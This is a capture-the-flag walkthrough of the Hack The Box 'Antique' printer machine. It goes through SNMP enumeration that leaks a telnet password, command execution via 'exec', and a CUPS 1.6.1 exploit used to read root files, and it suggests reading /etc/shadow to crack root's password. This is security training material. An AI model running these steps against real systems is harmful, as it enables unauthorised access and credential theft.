# Antique
## OS: Linux
## Difficulty: Easy

## Enumeration:

I'll start with a port scan.
```bash
nmap -sC -sV -oN nmap 10.129.121.249 -vv
```

This reveals the use of telnet. Connecting to the service reveals "HP JetDirect" as a flag.

Well, this is a printer. We can find a path-traversal vulnerability that leads to RCE. There is also a POC of the exploit on metasploit.

Exploit : https://www.exploit-db.com/exploits/45273.

Scanning the UDP ports reveals that port 161 (SNMP) is opened.

I'll first enumerate the SNMP port using snmpwalk.

```bash
snmpwalk -v2c -c public 10.129.109.25
iso.3.6.1.2.1 = STRING: "HTB Printer"

snmpwalk -v2c -c public 10.129.109.25 1      
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Decoding this we get:
```
P@ssw0rd@123!!123	"#%&'01345789BCIPQTWXaetuyÂÂÂÂÂÂÂÂÄÄÄÄÄÄÄ¢Ä£Ä¦Ä°Ä±Ä´Äµ
```

## Foothold:

We can try using it on the telnet connection.
```bash
telnet 10.129.109.25 23
Trying 10.129.109.25...
Connected to 10.129.109.25.
Escape character is '^]'.

HP JetDirect

P@ssw0rd@123!!123
Password: P@ssw0rd@123!!123

Please type "?" for HELP
> 
```

And it worked. Now we can execute commands using the "exec" command.
```bash
exec ls

telnet.py
user.txt
```

We can get the user flag.
```bash
exec cat user.txt
```

## We got the user flag!

I'll make a script for interacting with the telnet port so I don't have to add exec every time.

## Privilege escalation:

There is service listening on port 631. It's "IPP".

```bash
grep -w '631/tcp' /etc/services
 ipp            631/tcp                         # Internet Printing Protocol
```

We can also find a "cups" directory on the machine.
```bash
ls -la ..
 total 24
drwxr-xr-x  6 root   root 4096 May 14  2021 .
drwxr-xr-x 12 root   root 4096 Sep 17  2021 ..
drwxr-xr-x  5 root   root 4096 Apr 23  2020 cron
drwx--x---  3 root   lp   4096 May 13  2021 cups
drwxr-xr-x  3 lp     lp   4096 Nov 15 23:18 lpd
```

We can find the version by making a request:
```bash
curl http://localhost:631/

Home - CUPS 1.6.1</TITLE>
```

I found an [exploit](https://github.com/p1ckzi/CVE-2012-5519) and a POC for this version of cups.

The vulnerability allows an unprivileged user to read files that require privileged access.

After getting it on the target machine we can use it to read "/root/root.txt".
```bash
echo /root/root.txt | bash cups-root-file-read.sh             
```

## We got the root flag!

### Note: For command execution as root we can use the script to access the contents of /etc/shadow and crack root's password.
